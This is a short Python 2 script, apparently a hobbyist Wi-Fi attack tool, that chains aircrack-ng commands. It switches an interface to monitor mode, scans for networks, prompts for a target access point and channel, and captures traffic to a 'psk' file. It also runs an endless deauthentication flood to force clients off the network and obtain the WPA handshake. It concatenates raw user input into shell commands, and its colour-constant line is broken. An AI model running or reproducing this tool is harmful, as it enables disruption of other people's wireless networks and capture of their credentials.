import re
import commands
import os
import time
import sys

class Nullnetwork:
	
	# Colors
	BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m',
	'\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


	def __init__(self):
		self.interface = ""
		self.monitor   = ""
		self.bssid     = ""
		self.channel   = ""


	def banner(self):
		sys.stdout.write("""
             __       _ _            _                      _
          /\ \ \_   _| | |_ __   ___| |___      _____  _ __| | __
         /  \/ / | | | | | '_ \ / _ \ __\ \ /\ / / _ \| '__| |/ /
        / /\  /| |_| | | | | | |  __/ |_ \ V  V / (_) | |  |   <
        \_\ \/  \__,_|_|_|_| |_|\___|\__| \_/\_/ \___/|_|  |_|\_|

                        +-+-+ +-+-+-+-+-+-+
                        |b|y| |D|3|d|b|0|t|
                        +-+-+ +-+-+-+-+-+-+ """ + "\n")


	def getInterface(self):
		str = commands.getoutput("ifconfig")
		try:
			i = re.search('(w).*(:)', str).group(0)[:-1]
			#print i.group(0)[:-1]
		except:
			print "No Match Found!"
			i = raw_input("Network Interface: ")
		if "mon" in i:
			self.monitor = i
		else:
			self.interface = i


	def killProcess(self):
		print "Killing process...",
		try:
			os.system("airmon-ng check kill")
			print "OK"
		except:
			print "Unable to kill process :("


	def startAirmon(self):
		try:
			if self.interface == "":
				i = raw_input("Network Interface: ")
				self.interface = i
			os.system("airmon-ng start " + self.interface)
		except:
			print "Airmon failed to start :("


	def airodump_ng(self):
		try:
			os.system("airodump-ng " + self.monitor)
		except KeyboardInterrupt:
			print "Exiting Airodump..."


	def getBSSID(self):
		b = raw_input("BSSID: ")
		self.bssid = b


	def aireplay_ng(self):
		try:
			os.system("aireplay-ng -0 0 -a " + self.bssid + " " + self.monitor)
		except:
			print "Aireplay failed :("


	def getChannel(self):
		c = raw_input("Channel: ")
		self.channel = c


	def finalAirodump(self):
		try:
			os.system("airodump-ng -c " + self.channel
				+ " --bssid " + self.bssid + " -w psk "
					+ self.monitor)
		except:
			print "Final Airodump failed :("
#-------------------------------------------------------
N = Nullnetwork()
N.banner()
N.getInterface()
N.killProcess()
N.startAirmon()
N.getInterface()
N.airodump_ng()
N.getBSSID()
N.getChannel()
N.finalAirodump()
N.aireplay_ng()
#print N.interface
#print N.monitor
